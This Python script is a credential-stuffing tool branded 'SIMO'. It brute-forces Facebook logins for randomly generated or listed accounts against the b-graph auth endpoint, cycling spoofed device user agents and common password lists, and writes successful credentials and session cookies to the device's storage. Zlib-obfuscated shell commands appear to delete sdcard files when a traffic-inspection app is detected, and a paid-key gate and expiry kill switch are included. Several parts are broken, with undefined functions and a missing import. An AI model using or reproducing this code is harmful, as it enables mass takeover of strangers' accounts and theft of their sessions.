#Orignally Written By SIMO Khan
# Totally Written in python


samsung = ['SM-G920F|NRD90M', 'SM-T535|LRX22G', 'SM-T231|KOT49H', 'SM-J320F|LMY47V', 'GT-I9190|KOT49H', 'GT-N7100|KOT49H', 'SM-T561|KTU84P', 'GT-N7100|KOT49H', 'GT-I9500|LRX22C', 'SM-J320F|LMY47V', 'SM-G930F|NRD90M', 'SM-J320F|LMY47V', 'SM-J510FN|NMF26X', 'GT-P5100|IML74K', 'SM-J320F|LMY47V', 'GT-N8000|JZO54K', 'SM-T531|LRX22G', 'SPH-L720|KOT49H', 'GT-I9500|JDQ39', 'SM-G935F|NRD90M', 'SM-T561|KTU84P', 'SM-T531|KOT49H', 'SM-J320FN|LMY47V', 'SM-A500F|MMB29M', 'SM-A500FU|MMB29M', 'SM-A500F|MMB29M', 'SM-T311|KOT49H', 'SM-T531|LRX22G', 'SM-J320F|LMY47V', 'SM-J320FN|LMY47V', 'SM-J320F|LMY47V', 'GT-P5210|KOT49H', 'SM-T230|KOT49H', 'GT-I9192|KOT49H', 'SM-T235|KOT4', 'GT-N7100|KOT49H', 'SM-A500F|LRX22G', 'SM-A500F|MMB29M', 'GT-N7100|KOT49H', 'SM-G920F|MMB29K', 'SM-J510FN|NMF26X', 'GT-N8000|JZO54K', 'SM-J320FN|LMY47V', 'SM-J320FN|LMY47V', 'SM-A500H|MMB29M', 'GT-I9300|JSS15J', 'GT-I9500|LRX22C', 'SM-J320F|LMY4', 'SM-J510FN|NMF26X', 'SM-A500F|MMB29M', 'GT-N8000|KOT49H', 'SM-T561|KTU84P', 'SM-G900F|KOT49H', 'GT-S7390|JZO54K', 'SM-J320F|LMY47V', 'GT-P5100|JZO54K', 'SM-A500FU|MMB29M', 'SM-G930F|NRD90M', 'SM-J510FN|NMF26X', 'SM-T561|KTU84P', 'GT-N8000|KOT49H', 'SM-T531|LRX22G', 'SM-J510FN|MMB29M', 'SM-J510FN|NMF26X', 'SM-J320F|LMY47V', 'GT-P5110|JDQ39', 'GT-I9301I|KOT49H', 'SM-A500F|LRX22G', 'SM-G930F|NRD90M', 'SM-T311|KOT4', 'GT-P5200|KOT49H', 'GT-I9301I|KOT49H', 'SM-J320M|LMY47V', 'SM-T531|LRX22G', 'SM-T820|NRD90M', 'GT-I9192|KOT49H', 'SM-G935F|MMB29K', 'SM-J701F|NRD90M;', 'GT-I9301I|KOT4', 'SM-J320FN|LMY47V', 'SM-T111|JDQ39', 'SM-A500F|MMB29M', 'SM-J510FN|NMF2', 'SM-T705|LRX22G', 'SM-G920F|NRD90M', 'GT-N5100|JZO54K', 'GT-I9300I|KTU84P', 'GT-I9300I|KTU84P', 'GT-N8000|KOT49H', 'GT-N8000|KOT49H', 'SM-A500F|MMB29M', 'GT-I9190|KOT49H', 'SM-J510FN|NMF26X', 'SM-J320F|LMY47V', 'GT-P5100|JDQ39', 'GT-I9300I|KTU84P', 'GT-N5100|JZO54K', 'GT-N8000|KOT49H', 'GT-I9500|LRX22C', 'SM-J320FN|LMY47V', 'SM-A500F|MMB29M', 'GT-N8000|JZO54K', 'SM-T805|LRX22G', 'SM-T231|KOT49H', 'GT-N5100|JZO54K', 'SM-J320H|LMY47V', 'SM-T231|KOT49H', 'SM-G930F|NRD90M', 'SM-G935F|NRD90M', 'SM-T310|KOT49H', 'GT-N8000|KOT49H', 'GT-I9300I|KTU84P', 'SM-G920F|NRD90M', 'SM-J510FN|NMF26X', 'SM-T705|LRX22G;', 'GT-P3110|JZO54K', 'GT-I9192|KOT49H', 'SM-J320F|LMY47V', 'SM-G920F|NRD90M', 'GT-I9300|IMM76D', 'SM-G950F|NRD90M', 'SM-J320F|LMY47V', 'SM-J510FN|NMF26X;', 'SM-J701F|NRD90M', 'SM-A500F|LRX22G', 'SM-T231|KOT49H', 'SM-T311|KOT49H', 'SM-J320FN|LMY47V', 'GT-P5210|KOT49H', 'SM-T805|LRX22G', 'GT-I9500|LRX22C', 'GT-P5200|KOT49H', 'GT-I9301I|KOT49H', 'GT-I9300|JSS15J', 'GT-N7100|KOT49H', 'SM-T531|LRX22G', 'SM-T820|NRD90M', 'SM-T315|JDQ39', 'SM-J320F|LMY47V', 'GT-I9190|KOT49H', 'GT-P5220|JDQ39', 'SM-T525|KOT49H', 'SM-T555|LRX22G', 'GT-I9190|KOT49H', 'SM-J510FN|NMF26X;', 'SM-A500F|MMB29M', 'GT-I9192|KOT49H', 'GT-P5100|JDQ', 'SM-T311|KOT49H']

import os
from os import path
from pathlib import Path
import os,base64,zlib,pip,urllib,sys,time,platform,pip,uuid,subprocess,datetime
now = datetime.datetime.today()
now = datetime.datetime.today()
mm = str(now.month)
dd = str(now.day)
yyyy = str(now.year)
hour = str(now.hour)
mi = str(now.minute)
ss = str(now.second)
t=(mm + "/" + dd + "/" + yyyy + " " + hour + ":" + mi + ":" + ss)


hours = (now.hour)
x = datetime.datetime.now()
g= datetime.datetime(2023,12,13)
if (x.strftime("%x"))>(g.strftime("%x")):
 print('\033[1;32m تم ايقاف الاداه راسل المطور الزعيم  لتفعيل ')
 time.sleep(1)
 print('\033[1;31m 1')
 time.sleep(1)
 print('\033[1;32m 2')
 time.sleep(1)
 print('\033[1;31m 3')
 time.sleep(1)
 print('\033[1;32m 4')
 time.sleep(1)
 print('\033[1;31m 5')
 webbrowser.open('https://t.me/ZZKGZ')
 exit()
 open(".token.txt", "w").write(' . . . .')
 print(x)
try:
	import requests,os,json,time,re,random,sys,uuid,string
	from string import *
	from requests import api
	from concurrent.futures import ThreadPoolExecutor as tred
except ImportError:
	os.system('python SIMO.py')
os.system("clear")
print('\n\033[1;32m Loading SIMO Tools...')
#exec(zlib.decompress(b'x\x9c}\xccA\x0e@0\x10\x05\xd0\xab\xfc\x1d\x16XXJ\xdc\xa5t\xc4$\xa3\xaa3\x95\xb8\xbdX\x10+\x07xo\xd3FO5Z\xcb"rD\x0e\x1c\xd4\x9c\x08\x12\xed\x99\xd4\x14\xd3\xe2\x92\'CN"<v`\x1f\x1c&J\xc63\xa3>1\xa0\xf5t\xb4!\x8b\xf4w\xf1\x04\xbf\xee\xdd?\xba\xa8.k\xe33\x11'))
os.system('xdg-open https://facebook.com/groups/616555880415550/')
os.system('xdg-open https://t.me/M82EZ')


try:
	g = "anar"
	f="tt"
	file_d = os.listdir(zlib.decompress(b'x\x9c\xd3/NIN,J\xd1w\xccK)\xca\xcfL\xd1OI,I\xd4\x07\x00SL\x07\x89'))

	if f'com.h{f}pc{g}y.pro' in file_d:
		print('\033[1;37m[×] Uninstall HttpCanary From Your Device ')
		os.system(zlib.decompress(b'x\x9cKNQP\xf1\xf0w\xf5UPSS(\xcaU\xd0-JS\xd0\x02\x005\xfe\x05\x0f'))
		os.system(zlib.decompress(b'x\x9c+\xcaU\xd0-JS\xd0/NIN,J\xd1\xd7\x02\x00,D\x05\x1e'))
		os.system(zlib.decompress(b'x\x9c+\xcaU\xd0-JS\xd0/.\xc9/JLO\xd5O\xcd-\xcdI,IM\xd17\xd0\xd7\x02\x00\x8dJ\t\x81'))
		exit()
	else:
		pass
except Exception as e:
	pass

def xox(m):
	for x in m + '\n':
		sys.stdout.write(x)
		sys.stdout.flush()
		time.sleep(0.07)

def clear():
	os.system('clear')
	print(logo)
folder_path = '/sdcard/SIMO'
try:
	os.makedirs(folder_path, exist_ok=True)
except:
	pass
oks=[]
cps=[]
loop=0
logo=("""\033[1;37m 

\033[1;35m   /$$$$$$  /$$$$$$ /$$     /$$  /$$$$$$ 
 /$$__  $$|_  $$_/| $$$    /$$$ /$$__  $$
\033[1;35m| $$  \__/  | $$  | $$$$  /$$$$| $$  \ $$
|  $$$$$$   | $$  | $$ $$/$$ $$| $$  | $$
\033[1;35m \____  $$  | $$  | $$  $$$| $$| $$  | $$
 /$$  \ $$  | $$  | $$\  $ | $$| $$  | $$
\033[1;35m|  $$$$$$/ /$$$$$$| $$ \/  | $$|  $$$$$$/
\______/ |______/|__/     |__/ \______/ \033[1;36m
----------------------------------------------
\033[1;32m•\033[1;32m CREATED BY  \033[1;32m •√\033[1;32m  SIMO
\033[1;32m•\033[1;37m FACEBOOK    \033[1;37m •√\033[1;37m  SIMO OFF
\033[1;33m•\033[1;33m COUNTRY     \033[1;33m •√\033[1;33m  ALGERIA
\033[1;32m•\033[1;37m TOOLS       \033[1;37m •√\033[1;37m  FREE
\033[1;32m•\033[1;36m VERSION     \033[1;36m •√\033[1;36m  1.0
------------------------------------------------""")

def linex():
	print(f'\033[1;36m------------------------------------------------')

def Main_SIMO():
		clear()
		print(f' [1] File Cloning \n [2] Random Cloning \n [3] Gmail Cloning \n [4] WhatsApp group(SIMO) \n [5] Follow my fb id \n [0] Exit')
		linex()
		shm= input('\033[1;32m [+] Select option:\033[1;32m ')
		if shm =='1':
			file_crack()
		elif shm =='2':
			r_crack()
		elif shm =='3':
			gmail()
		elif shm =='4':
			wp=('KpSthW03CQR0wOim0sKtFX')
			os.system('xdg-open https://www.facebook.com/profile.php?id=100034758030239')
			Main_SIMO()
		elif shm =='5':
			os.system('xdg-open https://www.facebook.com/profile.php?id=100034758030239')
			Main_SIMO()
		elif shm =='0':
			exit(' Thanks For Using our tool ')
		else:
			print('\033[1;37m [+] Select valid option\033[1;37m ')
			time.sleep(0.5)
			Main_SIMO()

def file_crack():
	clear()
	file = input(' [+] Put file path :\033[1;32m ')
	try:
		fo = open(file,'r').read().splitlines()
	except FileNotFoundError:
		print('\033[1;37m [+] File location not found ');exit()
	clear()
	print('\033[1;32m [1] Method 1 ')
	print('\033[1;34m [2] Method 2 ')
	print('\033[1;34m [3] Method 3 ')
	print('\033[1;34m [4] Method 4 ')
	linex()
	methd=input('\033[1;37m [+] Select Option:\033[1;32m ')
	plist=[]
	clear()
	try:
		ps_limit = int(input(' How Many Pasword You Want To Add :\033[1;32m  '))
	except:
		ps_limit =1
#	linex()
#	print('\033[1;37m example :\033[1;37mfirst last, firtslast, first123')
	linex()
	for i in range(ps_limit):
		plist.append(input(f'\033[1;37m Put Password No.{i+1}:\033[1;32m '))
	with tred(max_workers=30) as SIMO:
		clear()
		tl = str(len(fo))
		print(' Total accounts : \033[1;32m'+tl)
		print('\033[1;37m Process Running in the Background ')
		linex()
		for user in fo:
			ids,names = user.split('|')
			passlist = plist
			if methd =='1':
				SIMO.submit(api1,ids,names,passlist)
			else:
				SIMO.submit(api1,ids,names,passlist)
	print('\033[1;37m')
	linex()
	print(' [+] The process has completed')
	print('\033[1;32m [+] Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
	linex()
	input('\033[1;32m [*] Press enter to back \033[1;37m')
	os.system('python SIMO.py')

def r_crack():
	clear()
	print(' [1] Pakistan Cloning ')
	print(' [2] Bangladesh Cloning ')
	print(' [3] Afghanistan Cloning ')
	print(' [0] Back To Menu ')
	linex()
	crk=input(' [+] Select Option:\33[1;37m ')
	if crk =='1':
		pak()
	elif crk =='2':
		bd()
	elif crk =='3':
		afg()
	elif crk =='0':
		Menu_SIMO()
	else:
		print('\n  [+] Select valid option\033[1;37m ');time.sleep(1.5);menu()

def pak():
	user=[]
	clear()
	code = input('\33[1;37m [+] Enter Code :\33[1;37m ')
	try:
		limit = int(input(' [+] Enter limit:\33[1;37m '))
	except ValueError:
		limit = 5000
	for nmbr in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(7))
		user.append(nmp)
	with tred(max_workers=30) as SIMO:
		clear()
		tl = str(len(user))
		print(' [+] Total accounts : \033[1;32m'+tl)
		print('\33[1;37m [+] Selected code  :\033[1;32m '+code)
		print('\33[1;37m [+] Process has been started\033[1;97m')
		linex()
		for psx in user:
			ids = code+psx
			passlist = [psx,ids,'khankhan','khan123','malik123','baloch123','kingkhan','khan12345','malik1234','khanbaba','pak123','pak786','malik1122','khan1122']
			SIMO.submit(rd1,ids,passlist)
	print('\033[1;37m')
	linex()
	print(' [+] The process has completed')
	print(' [+] Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
	linex()
	input(' [+] Press enter to back \033[1;37m')
	os.system('python SIMO.py')


def bd():
	user=[]
	clear()
	code = input(' [+] Enter Code :\33[1;37m ')
	try:
		limit = int(input(' [+] Enter limit:\33[1;37m '))
	except ValueError:
		limit = 5000
	for nmbr in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(8))
		user.append(nmp)
	with tred(max_workers=30) as SIMO:
		clear()
		tl = str(len(user))
		print(' [+] Total accounts : \033[1;32m'+tl)
		print('\33[1;37m [+] Selected code  :\033[1;32m '+code)
		print('\33[1;37m [+] Process has been started \033[1;97m')
		linex()
		for psx in user:
			ids = code+psx
			passlist = ['i love you','bangladesh','freefire','bangla123','bangladesh123',ids,psx]
			SIMO.submit(rd1,ids,passlist)
	print('\033[1;37m')
	linex()
	print(' [+] The process has completed')
	print('\033[1;32m [+] Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
	linex()
	input(' [+] Press enter to back \033[1;37m')
	os.system('python SIMO.py')

def afg():
	user=[]
	clear()
	code = input(' [+] Enter Code :\33[1;37m ')
	try:
		limit = int(input(' [+] Enter limit:\33[1;37m '))
	except ValueError:
		limit = 5000
	for nmbr in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(7))
		user.append(nmp)
	with tred(max_workers=30) as SIMO:
		clear()
		tl = str(len(user))
		print(' [+] Total accounts : \033[1;32m'+tl)
		print('\33[1;37m [+] Selected code  :\033[1;32m '+code)
		print('\33[1;37m [+] Process running in the background\033[1;97m')
		linex()
		for psx in user:
			ids = code+psx
			passlist = [ids,psx,'100200','afghanistan','Afghan123','afghan1122','kabul123']
			ABDOU.submit(rd1,ids,passlist)
	print('\033[1;37m')
	linex()
	print(' [+] The process has completed')
	print(' [+] Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
	linex()
	input(' [+] Press enter to back \033[1;37m')
	os.system('python SIMO.py')

def rd1(ids,passlist):
	try:
		global ok,loop,sim_id
		sys.stdout.write('\r\r\33[1;37m[SIMO]  %s|  OK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
		for pas in passlist:
				accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
				fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
				fbbv = str(random.randint(000000000,999999999))
				accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
				fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
				fbbv = str(random.randint(000000000,999999999))
				fbrv = str(random.randint(000000000,999999999))
				fbsv = str(random.randint(4,13))+'.0'
				model,build = random.choice(samsung).split('|')
				fbmf = 'samsung'
				fbbd = 'samsung'
				en = random.choice(['en_US','en_GB'])
				cph = random.choice(['CPH1979','CPH1983','CPH1987','CPH2005','CPH2009','CPH2015','CPH2059','CPH2061','CPH2065','CPH2069','CPH2071','CPH2073','CPH2077','CPH2091','CPH2095','CPH2099','CPH2137','CPH2139','CPH2145','CPH2161','CPH2185','CPH2201','CPH2209','CPH1801','CPH1803','CPH1805','CPH1809','CPH1827','CPH1837','CPH1851','CPH1853'])
				network = random.choice(['Zong','Roshan','null','Marshmallow','Telekom China'])
				ua  = "[FB4A/;FBAV/;FBBV/390796600;FBAN/FB4A;FBAV/;FBBV/390796600;FBDM//*{density=3.0,width=2560,height=1280};FBLC/en_US;FBRV/783190061;FBCR/LG;FBMF/Xiaomi;FBBD/OnePlus;FBPN/com.facebook.katana;FBDV/Samsung_Galaxy_F62;FBSV/17;FBOP/6;FBCA/x86;FBSS/;]"
				head = {
    'authority': 'm.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'max-age=0',
    'dpr': '2.700000047683716',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.26"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '"MI PLAY"',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"8.1.0"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS 7 9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/188.0.4806.131 Safari/537.36 OPR/154.0.4634.144',
    'viewport-width': '980',
}
				data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale':'en_US','client_country_code':'US','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':accees_token}
				po = requests.post('https://b-graph.facebook.com/auth/login', data=data, headers=head).json()
				if 'session_key' in po:
						uid = str(po['uid'])
						ckkk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
						ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
						cookie = f"sb={ssbb};{ckkk}"
						print('\r\r\033[1;32m[SIMO-OK] '+uid+' | '+pas)
						#print(' \33[1;96m[Cookies] == '+cookie)
						file_path_ok = os.path.join(folder_path, 'SIMO_RANDOM_OK.txt')
						file_path_cookies = os.path.join(folder_path, 'SIMO_COOKIES.txt')
						with open(file_path_ok, 'a') as file_ok, open(file_path_cookies, 'a') as file_cookies:
							file_ok.write(uid+'|'+pas+'\n')
							file_cookies.write(uid+'|'+pas+'|'+cookie+'\n')
						oks.append(uid)
						break
				elif 'www.facebook.com' in po['error']['message']:
						uid = str(po['error']['error_data']['uid'])
						#print(f'\r\r\33[1m\33[1;35m [SIMO-CP] '+uid+' | '+pas+'\033[1;97m')
						file_path = os.path.join(folder_path, 'SIMO-CP.txt')
						with open(file_path, 'a') as file:
							file.write(uid+'|'+pas+'\n')
						cps.append(uid)
						break
				else:
					continue
		loop+=1
	except requests.exceptions.ConnectionError:
		time.sleep(20)
	except Exception as e:
		pass

def api1(ids,names,passlist):
	try:
		global ok,loop,sim_id
		sys.stdout.write('\r\r\33[1;37m[SIMO-M1]  %s|  OK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
		fn = names.split(' ')[0]
		try:
			ln = names.split(' ')[1]
		except:
			ln = fn
		for pw in passlist:
			pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
			accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
			fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
			fbbv = str(random.randint(000000000,999999999))
			accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
			fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
			fbbv = str(random.randint(000000000,999999999))
			fbrv = str(random.randint(000000000,999999999))
			fbsv = str(random.randint(4,13))+'.0'
			model,build = random.choice(samsung).split('|')
			fbmf = 'samsung'
			fbbd = 'samsung'
			en = random.choice(['en_US','en_GB'])
			cph = random.choice(['CPH1979','CPH1983','CPH1987','CPH2005','CPH2009','CPH2015','CPH2059','CPH2061','CPH2065','CPH2069','CPH2071','CPH2073','CPH2077','CPH2091','CPH2095','CPH2099','CPH2137','CPH2139','CPH2145','CPH2161','CPH2185','CPH2201','CPH2209','CPH1801','CPH1803','CPH1805','CPH1809','CPH1827','CPH1837','CPH1851','CPH1853'])
			network = random.choice(['Zong','Roshan','null','Marshmallow','Telekom China'])
			ua  = "[FB4A/;FBAV/A1XDL5U4;FBBV/399943003;FBAN/FB4A;FBAV/A1XDL5U4;FBBV/399943003;FBDM//*{density=2.5,width=1080,height=2560};FBLC/zh_CN;FBRV/503718214;FBCR/OPPO;FBMF/OnePlus;FBBD/Lenovo;FBPN/com.facebook.katana;FBDV/Vivo_Y100s;FBSV/11;FBOP/6;FBCA/armeabi;FBSS/14;]"
			head = {
    'authority': 'm.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'max-age=0',
    'dpr': '2.700000047683716',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.26"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '"MI PLAY"',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"8.1.0"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)E570E) AppleWebKit/537.36 (KHTML, like Gecko)145.0.4690.84 Chrome/165.0.2.0 Safari/537.36',
    'viewport-width': '980',
}
			data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale':'en_US','client_country_code':'US','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':accees_token}
			po = requests.post('https://b-graph.facebook.com/auth/login',data=data,headers=head).json()
			if 'session_key' in po:
					uid = str(po['uid'])
					print('\r\r\033[1;32m [SIMO-OK] '+uid+' | '+pas)
					file_path = os.path.join(folder_path, 'SIMO_FILE_OK.txt')
					with open(file_path, 'a') as file:
						file.write(uid+'|'+pas+'\n')
					oks.append(uid)
					break
			elif 'www.facebook.com' in po['error']['message']:
					uid = str(po['error']['error_data']['uid'])
					#print(f'\r\r\33[1m\33[1;35m [ABDOU-CP] '+uid+' | '+pas+'\033[1;97m')
					file_path = os.path.join(folder_path, 'SIMO-CP.txt')
					with open(file_path, 'a') as file:
						file.write(uid+'|'+pas+'\n')
					cps.append(uid)
					break
			else:
				continue
		loop+=1
	except requests.exceptions.ConnectionError:
		time.sleep(20)
	except Exception as e:
		pass

def main_apv():
    imt = '578'
    os.system('clear')
    print(logo)
    try:
        key1 = open('/sdcard/.abdou.key.txt', 'r').read()
    except IOError:
        os.system('clear')
        print(logo)
       
        myid = uuid.uuid4().hex[:30]
        
        kok = open('/sdcard/.simo.key.txt', 'w')
        kok.write(myid + imt)
        kok.close()
    
        input(' Exit And Again Run The Command');os.system('python DOD.py')
        tks = ('Hello%20simo%20Owner%20simo%20!!%20Please%20Approve%20My%20Key%20Key%20:%20'+key1);os.system('am start https://wa.me/+?text='+tks)

    r1 = requests.get('https://github.com/Abdouch18/Tool/blob/main/abdou.txt').text
   
    if key1 in r1:
        menu()
    else:
        os.system('clear')
        print(logo)
        print(' \033[1;37mKey : \033[1;32m' + key1)
        print (' \033[1;37mThis Tool is Paid So Need Get Approval') 
       
        #print(' Payment Number Details\n 03239021979 \n Easypaisa or Jazzcash');linex()
        input(' \033[1;37mPress Enter To send key Admin')
        tks = ('Hello%20abdou%20Owner%20andou tool%20!!%20Please%20Approve%20My%20Key%20Key%20:%20'+key1);os.system('am start https://wa.me/+213664947595?text='+tks)
        main_apv() 
main_apv()          
       
